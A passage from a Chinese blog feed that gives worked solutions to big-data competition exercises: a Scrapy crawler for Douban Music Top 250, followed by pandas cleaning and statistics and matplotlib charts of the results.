punctuation">(</span><span class="token string">'leixing'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>groups<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">.</span>groupby<span class="token punctuation">(</span><span class="token string">'leixing'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">sum</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'rate'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment"># x轴默认是s的索引</span><span class="token comment"># y轴默认是s的值</span><span class="token builtin">file</span><span class="token punctuation">.</span>groupby<span class="token punctuation">(</span><span class="token string">'leixing'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">sum</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'rate'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>plot<span class="token punctuation">(</span>kind<span class="token operator">=</span><span class="token string">'bar'</span><span class="token punctuation">)</span><span class="token comment"># # 显示图形</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>2、 用折线图显示各档次酒店平均评分走势；</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 指定字体为SimHei</span>matplotlib<span class="token punctuation">.</span>rcParams<span class="token punctuation">[</span><span class="token string">'font.sans-serif'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'SimHei'</span><span class="token comment"># 酒店总数</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">.</span>groupby<span class="token punctuation">(</span><span class="token string">'leixing'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>groups<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">.</span>groupby<span class="token punctuation">(</span><span class="token string">'leixing'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'rate'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>mean<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># x轴默认是s的索引</span><span class="token comment"># y轴默认是s的值</span><span class="token builtin">file</span><span class="token punctuation">.</span>groupby<span class="token punctuation">(</span><span class="token string">'leixing'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'rate'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>mean<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>plot<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># # 显示图形</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>3、 用饼图显示各档次酒店数占比。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 指定字体为SimHei</span>matplotlib<span class="token punctuation">.</span>rcParams<span class="token punctuation">[</span><span class="token string">'font.sans-serif'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'SimHei'</span><span class="token comment"># 统计各类的占比</span>count <span class="token operator">=</span> <span class="token builtin">file</span><span class="token punctuation">[</span><span class="token string">'leixing'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>value_counts<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>count<span class="token punctuation">)</span><span class="token comment"># x轴默认是s的索引</span><span class="token comment"># y轴默认是s的值</span>count<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>kind<span class="token operator">=</span><span class="token string">'pie'</span><span class="token punctuation">)</span><span class="token comment"># # 显示图形</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 大数据 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 大数据 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>大数据-北京四合</title>
      <link href="/2023/08/22/%E5%A4%A7%E6%95%B0%E6%8D%AE-%E5%8C%97%E4%BA%AC%E5%9B%9B%E5%90%88/"/>
      <url>/2023/08/22/%E5%A4%A7%E6%95%B0%E6%8D%AE-%E5%8C%97%E4%BA%AC%E5%9B%9B%E5%90%88/</url>
      
        <content type="html"><![CDATA[<h1 id="试题1-豆瓣音乐"><a href="#试题1-豆瓣音乐" class="headerlink" title="试题1-豆瓣音乐"></a>试题1-豆瓣音乐</h1><h2 id="任务A：数据采集与处理"><a href="#任务A：数据采集与处理" class="headerlink" title="任务A：数据采集与处理"></a>任务A：数据采集与处理</h2><h3 id="子任务一：数据采集"><a href="#子任务一：数据采集" class="headerlink" title="子任务一：数据采集"></a>子任务一：数据采集</h3><p>豆瓣音乐 Top 250（<a href="https://music.douban.com/top250%EF%BC%89">https://music.douban.com/top250）</a><br><strong>标题、封面、歌手、发行日期、类型、介质、曲风、评分、评价人数并且存入到music.csv文件中</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># (爬虫)部门是公司的核心业务部门</span><span class="token comment"># 负责创建requests对象和接受引擎发送过来的response（Downloader部门爬取到的内容），从中解析并提取出有用的数据。</span><span class="token comment"># 它对应的是爬虫流程【解析数据】和【提取数据】这两步</span><span class="token keyword">import</span> scrapy<span class="token keyword">import</span> bs4<span class="token keyword">import</span> re<span class="token comment"># 需要引用DoubanItem，它在items里面。因为是items在top250.py的上一级目录，所以要用..items，这是一个固定用法。</span><span class="token keyword">from</span> <span class="token punctuation">.</span><span class="token punctuation">.</span>items <span class="token keyword">import</span> DoubanItem<span class="token comment"># DoubanSpider类继承自scrapy.Spider类</span><span class="token keyword">class</span> <span class="token class-name">DoubanSpider</span><span class="token punctuation">(</span>scrapy<span class="token punctuation">.</span>Spider<span class="token punctuation">)</span><span class="token punctuation">:</span>    name <span class="token operator">=</span> <span class="token string">'music'</span>   <span class="token comment"># 定义爬虫的名字，这个名字是爬虫的唯一标识</span>    <span class="token comment"># allowed_domains是定义允许爬虫爬取的网址域名（不需要加https://）。</span>    <span class="token comment"># 如果网址的域名不在这个列表里，就会被过滤掉</span>    <span class="token comment"># 一定在book.douban.com这个域名之下，防止爬到广告页面去</span>    allowed_domains <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'music.douban.com'</span><span class="token punctuation">]</span>    <span class="token comment"># 定义起始网址，就是爬虫从哪个网址开始抓取</span>    <span class="token comment"># 注：allowed_domains的设定对start_urls里的网址不会有影响</span>    start_urls <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'https://music.douban.com/top250'</span><span class="token punctuation">]</span>    <span class="token comment"># 根据url的规律，构建出前三页地址</span>    start_urls <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        url <span class="token operator">=</span> <span class="token string">'https://music.douban.com/top250?start='</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x <span class="token operator">*</span> <span class="token number">25</span><span class="token punctuation">)</span>        start_urls<span class="token punctuation">.</span>append<span class="token punctuation">(</span>url<span class="token punctuation">)</span>        <span class="token comment"># 解析下载器传过来的数据</span>    <span class="token keyword">def</span> <span class="token function">parse</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> response<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> response<span class="token punctuation">.</span>status <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>            <span class="token comment"># 爬取的数据存储在response.text</span>            bs <span class="token operator">=</span> bs4<span class="token punctuation">.</span>BeautifulSoup<span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">,</span><span class="token string">'html.parser'</span><span class="token punctuation">)</span>            datas <span class="token operator">=</span> bs<span class="token punctuation">.</span>find_all<span class="token punctuation">(</span><span class="token string">'tr'</span><span class="token punctuation">,</span>class_<span class="token operator">=</span><span class="token string">"item"</span><span class="token punctuation">)</span>            <span class="token keyword">for</span> data <span class="token keyword">in</span>  datas<span class="token punctuation">:</span>                <span class="token comment">#实例化DoubanItem类。</span>                item <span class="token operator">=</span> DoubanItem<span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token comment"># 标题</span>                item<span class="token punctuation">[</span><span class="token string">'title'</span><span class="token punctuation">]</span> <span class="token operator">=</span> data<span class="token punctuation">.</span>find_all<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>text                <span class="token comment"># 封面</span>                item<span class="token punctuation">[</span><span class="token string">'fengmian'</span><span class="token punctuation">]</span> <span class="token operator">=</span> data<span class="token punctuation">.</span>find_all<span class="token punctuation">(</span><span class="token string">'img'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'src'</span><span class="token punctuation">]</span>                <span class="token comment"># 评分</span>                item<span class="token punctuation">[</span><span class="token string">'rate'</span><span class="token punctuation">]</span> <span class="token operator">=</span> data<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">'span'</span><span class="token punctuation">,</span>class_<span class="token operator">=</span><span class="token string">'rating_nums'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text                <span class="token comment"># 评论数</span>                rate_count <span class="token operator">=</span> data<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">'span'</span><span class="token punctuation">,</span>class_<span class="token operator">=</span><span class="token string">'pl'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text                pattern <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">'(\d*?)人评价'</span><span class="token punctuation">)</span>                item<span class="token punctuation">[</span><span class="token string">'rate_count'</span><span class="token punctuation">]</span> <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>pattern<span class="token punctuation">,</span>rate_count<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>                <span class="token comment"># 剩下的要进入详情页继续爬</span>                href <span class="token operator">=</span> data<span class="token punctuation">.</span>find_all<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'href'</span><span class="token punctuation">]</span>                <span class="token keyword">yield</span> scrapy<span class="token punctuation">.</span>Request<span class="token punctuation">(</span>href<span class="token punctuation">,</span> callback<span class="token operator">=</span>self<span class="token punctuation">.</span>parse2<span class="token punctuation">,</span>meta<span class="token operator">=</span><span class="token punctuation">{</span>                    <span class="token string">'title'</span><span class="token punctuation">:</span>item<span class="token punctuation">[</span><span class="token string">'title'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                    <span class="token string">'fengmian'</span><span class="token punctuation">:</span>item<span class="token punctuation">[</span><span class="token string">'fengmian'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                    <span class="token string">'rate'</span><span class="token punctuation">:</span>item<span class="token punctuation">[</span><span class="token string">'rate'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                    <span class="token string">'rate_count'</span><span class="token punctuation">:</span>item<span class="token punctuation">[</span><span class="token string">'rate_count'</span><span class="token punctuation">]</span>                <span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token comment"># 解析详情页</span>    <span class="token keyword">def</span> <span class="token function">parse2</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> response<span class="token punctuation">)</span><span class="token punctuation">:</span>        bs <span class="token operator">=</span> bs4<span class="token punctuation">.</span>BeautifulSoup<span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">,</span><span class="token string">'html.parser'</span><span class="token punctuation">)</span>        item <span class="token operator">=</span> DoubanItem<span class="token punctuation">(</span><span class="token punctuation">)</span>        item<span class="token punctuation">[</span><span class="token string">'title'</span><span class="token punctuation">]</span> <span class="token operator">=</span> response<span class="token punctuation">.</span>meta<span class="token punctuation">[</span><span class="token string">'title'</span><span class="token punctuation">]</span>        item<span class="token punctuation">[</span><span class="token string">'fengmian'</span><span class="token punctuation">]</span> <span class="token operator">=</span> response<span class="token punctuation">.</span>meta<span class="token punctuation">[</span><span class="token string">'fengmian'</span><span class="token punctuation">]</span>        item<span class="token punctuation">[</span><span class="token string">'rate'</span><span class="token punctuation">]</span> <span class="token operator">=</span> response<span class="token punctuation">.</span>meta<span class="token punctuation">[</span><span class="token string">'rate'</span><span class="token punctuation">]</span>        item<span class="token punctuation">[</span><span class="token string">'rate_count'</span><span class="token punctuation">]</span> <span class="token operator">=</span> response<span class="token punctuation">.</span>meta<span class="token punctuation">[</span><span class="token string">'rate_count'</span><span class="token punctuation">]</span>        <span class="token comment"># 歌手、发行日期、类型、介质、曲风</span>        pattern <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">r'&lt;a href="/search.*?"&gt;(.*?)&lt;/a&gt;'</span><span class="token punctuation">)</span>        item<span class="token punctuation">[</span><span class="token string">'geshou'</span><span class="token punctuation">]</span> <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>pattern<span class="token punctuation">,</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        pattern <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">r'\d{4}-\d{2}-\d{2}'</span><span class="token punctuation">)</span>        item<span class="token punctuation">[</span><span class="token string">'date'</span><span class="token punctuation">]</span> <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>pattern<span class="token punctuation">,</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        pattern <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">r'&lt;span class="pl"&gt;专辑类型:&lt;/span&gt;&amp;nbsp;(.*?)\n'</span><span class="token punctuation">)</span>        item<span class="token punctuation">[</span><span class="token string">'type'</span><span class="token punctuation">]</span> <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>pattern<span class="token punctuation">,</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        pattern <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">r'&lt;span class="pl"&gt;介质:&lt;/span&gt;&amp;nbsp;(.*?)\n'</span><span class="token punctuation">)</span>        item<span class="token punctuation">[</span><span class="token string">'jiezhi'</span><span class="token punctuation">]</span> <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>pattern<span class="token punctuation">,</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        pattern <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">r'&lt;span class="pl"&gt;流派:&lt;/span&gt;&amp;nbsp;(.*?)\n'</span><span class="token punctuation">)</span>        item<span class="token punctuation">[</span><span class="token string">'qufeng'</span><span class="token punctuation">]</span> <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>pattern<span class="token punctuation">,</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        <span class="token keyword">yield</span> item<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># （数据管道）部门则是公司的数据部门</span><span class="token comment"># 只负责存储和处理Spiders部门提取到的有用数据。这个对应的是爬虫流程【存储数据】这一步。</span><span class="token keyword">import</span> scrapy<span class="token comment">#定义一个类DoubanItem，它继承自scrapy.Item</span><span class="token keyword">class</span> <span class="token class-name">DoubanItem</span><span class="token punctuation">(</span>scrapy<span class="token punctuation">.</span>Item<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># scrapy.Field() 相当于自定义字典类型</span>    title <span class="token operator">=</span> scrapy<span class="token punctuation">.</span>Field<span class="token punctuation">(</span><span class="token punctuation">)</span>     fengmian <span class="token operator">=</span> scrapy<span class="token punctuation">.</span>Field<span class="token punctuation">(</span><span class="token punctuation">)</span>     geshou <span class="token operator">=</span> scrapy<span class="token punctuation">.</span>Field<span class="token punctuation">(</span><span class="token punctuation">)</span>     date <span class="token operator">=</span> scrapy<span class="token punctuation">.</span>Field<span class="token punctuation">(</span><span class="token punctuation">)</span>     <span class="token builtin">type</span> <span class="token operator">=</span> scrapy<span class="token punctuation">.</span>Field<span class="token punctuation">(</span><span class="token punctuation">)</span>     jiezhi <span class="token operator">=</span> scrapy<span class="token punctuation">.</span>Field<span class="token punctuation">(</span><span class="token punctuation">)</span>     qufeng <span class="token operator">=</span> scrapy<span class="token punctuation">.</span>Field<span class="token punctuation">(</span><span class="token punctuation">)</span>     rate <span class="token operator">=</span> scrapy<span class="token punctuation">.</span>Field<span class="token punctuation">(</span><span class="token punctuation">)</span>     rate_count <span class="token operator">=</span> scrapy<span class="token punctuation">.</span>Field<span class="token punctuation">(</span><span class="token punctuation">)</span>     href <span class="token operator">=</span> scrapy<span class="token punctuation">.</span>Field<span class="token punctuation">(</span><span class="token punctuation">)</span>     comment <span class="token operator">=</span> scrapy<span class="token punctuation">.</span>Field<span class="token punctuation">(</span><span class="token punctuation">)</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="子任务二：数据处理"><a href="#子任务二：数据处理" class="headerlink" title="子任务二：数据处理"></a>子任务二：数据处理</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pandas <span class="token keyword">as</span> pd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>删除music2.csv中发型日期不为年-月-日格式的数据并且存入music2_c1_N.csv,N为删除的数据条数</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">df <span class="token operator">=</span> pd<span class="token punctuation">.</span>read_csv<span class="token punctuation">(</span><span class="token string">'music.csv'</span><span class="token punctuation">)</span><span class="token comment"># 删除music2.csv中发型日期不为年-月-日格式的数据</span><span class="token comment"># 并且存入music2_c1_N.csv,N为删除的数据条数</span>pattern <span class="token operator">=</span> <span class="token string">r'\d{4}-\d{2}-\d{2}'</span>df_fil <span class="token operator">=</span> df<span class="token punctuation">[</span>df<span class="token punctuation">[</span><span class="token string">'date'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token builtin">str</span><span class="token punctuation">.</span>contains<span class="token punctuation">(</span>pattern<span class="token punctuation">)</span><span class="token punctuation">]</span>N <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>df<span class="token punctuation">)</span><span class="token operator">-</span><span class="token builtin">len</span><span class="token punctuation">(</span>df_fil<span class="token punctuation">)</span>df_fil<span class="token punctuation">.</span>to_csv<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'music2_c1_</span><span class="token interpolation"><span class="token punctuation">{</span>N<span class="token punctuation">}</span></span><span class="token string">.csv'</span></span><span class="token punctuation">,</span>index<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>删除music2.csv中删除数据源中歌手名大于10个字符的数据记录并且存入music2_c2_<strong>N</strong>.csv,N为删除的条数</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">df <span class="token operator">=</span> pd<span class="token punctuation">.</span>read_csv<span class="token punctuation">(</span><span class="token string">'music.csv'</span><span class="token punctuation">)</span>df_fil <span class="token operator">=</span> df<span class="token punctuation">[</span>df<span class="token punctuation">[</span><span class="token string">'geshou'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token builtin">str</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">str</span><span class="token punctuation">.</span><span class="token builtin">len</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&lt;=</span><span class="token number">10</span><span class="token punctuation">]</span>N <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>df<span class="token punctuation">)</span><span class="token operator">-</span><span class="token builtin">len</span><span class="token punctuation">(</span>df_fil<span class="token punctuation">)</span>df_fil<span class="token punctuation">.</span>to_csv<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'music2_c2_</span><span class="token interpolation"><span class="token punctuation">{</span>N<span class="token punctuation">}</span></span><span class="token string">.csv'</span></span><span class="token punctuation">,</span>index<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>将music2.csv中评分低于8.5的数据设置为0并且存入music2_c3.csv；</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">df <span class="token operator">=</span> pd<span class="token punctuation">.</span>read_csv<span class="token punctuation">(</span><span class="token string">'music.csv'</span><span class="token punctuation">)</span><span class="token comment"># 方法一</span><span class="token keyword">def</span> <span class="token function">rate</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> i <span class="token operator">&gt;</span> <span class="token number">8.5</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> i    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token number">0</span>df<span class="token punctuation">[</span><span class="token string">'rate'</span><span class="token punctuation">]</span> <span class="token operator">=</span> df<span class="token punctuation">[</span><span class="token string">'rate'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token builtin">map</span><span class="token punctuation">(</span>rate<span class="token punctuation">)</span><span class="token comment">#方法二</span>df<span class="token punctuation">[</span><span class="token string">'rate'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>loc<span class="token punctuation">[</span>df<span class="token punctuation">[</span><span class="token string">'rate'</span><span class="token punctuation">]</span><span class="token operator">&lt;</span><span class="token number">8.5</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span>df<span class="token punctuation">.</span>to_csv<span class="token punctuation">(</span><span class="token string">'music2_c3.csv'</span><span class="token punctuation">,</span>index<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>将music2.csv中评价人数设置为平均值并且存入music2_c4_N.csv，N为平均值取整</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">df <span class="token operator">=</span> pd<span class="token punctuation">.</span>read_csv<span class="token punctuation">(</span><span class="token string">'music.csv'</span><span class="token punctuation">)</span>df<span class="token punctuation">[</span><span class="token string">'rate_count'</span><span class="token punctuation">]</span> <span class="token operator">=</span> df<span class="token punctuation">[</span><span class="token string">'rate_count'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>mean<span class="token punctuation">(</span><span class="token punctuation">)</span>N <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>df<span class="token punctuation">[</span><span class="token string">'rate_count'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>mean<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>df<span class="token punctuation">.</span>to_csv<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'music2_c4_</span><span class="token interpolation"><span class="token punctuation">{</span>N<span class="token punctuation">}</span></span><span class="token string">.csv'</span></span><span class="token punctuation">,</span>index<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="任务B：数据分析与可视化"><a href="#任务B：数据分析与可视化" class="headerlink" title="任务B：数据分析与可视化"></a>任务B：数据分析与可视化</h2><h3 id="子任务一：数据分析"><a href="#子任务一：数据分析" class="headerlink" title="子任务一：数据分析"></a>子任务一：数据分析</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pandas <span class="token keyword">as</span> pddf <span class="token operator">=</span> pd<span class="token punctuation">.</span>read_csv<span class="token punctuation">(</span><span class="token string">'music.csv'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>分别统计各个曲风的音乐总数</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span>df<span class="token punctuation">.</span>groupby<span class="token punctuation">(</span><span class="token string">'qufeng'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>size<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>reset_index<span class="token punctuation">(</span>name<span class="token operator">=</span><span class="token string">'count'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>统计各个曲风所有音乐的平均评价数</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span>df<span class="token punctuation">.</span>groupby<span class="token punctuation">(</span><span class="token string">'qufeng'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'rate_count'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>mean<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">apply</span><span class="token punctuation">(</span><span class="token keyword">lambda</span> x<span class="token punctuation">:</span><span class="token builtin">int</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>reset_index<span class="token punctuation">(</span>name<span class="token operator">=</span><span class="token string">'count'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>统计各个歌手音乐的平均评分</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span>df<span class="token punctuation">.</span>groupby<span class="token punctuation">(</span><span class="token string">'geshou'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'rate'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>mean<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">apply</span><span class="token punctuation">(</span><span class="token keyword">lambda</span> x<span class="token punctuation">:</span><span class="token builtin">round</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>reset_index<span class="token punctuation">(</span>name<span class="token operator">=</span><span class="token string">'mean_rate'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>统计所有大于9.0评分音乐的平均评价数</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>df<span class="token punctuation">[</span>df<span class="token punctuation">[</span><span class="token string">'rate'</span><span class="token punctuation">]</span><span class="token operator">&gt;</span><span class="token number">9.0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'rate_count'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>mean<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="子任务二：数据可视化"><a href="#子任务二：数据可视化" class="headerlink" title="子任务二：数据可视化"></a>子任务二：数据可视化</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt<span class="token keyword">import</span> matplotlib<span class="token keyword">import</span> pandas <span class="token keyword">as</span> pd<span class="token 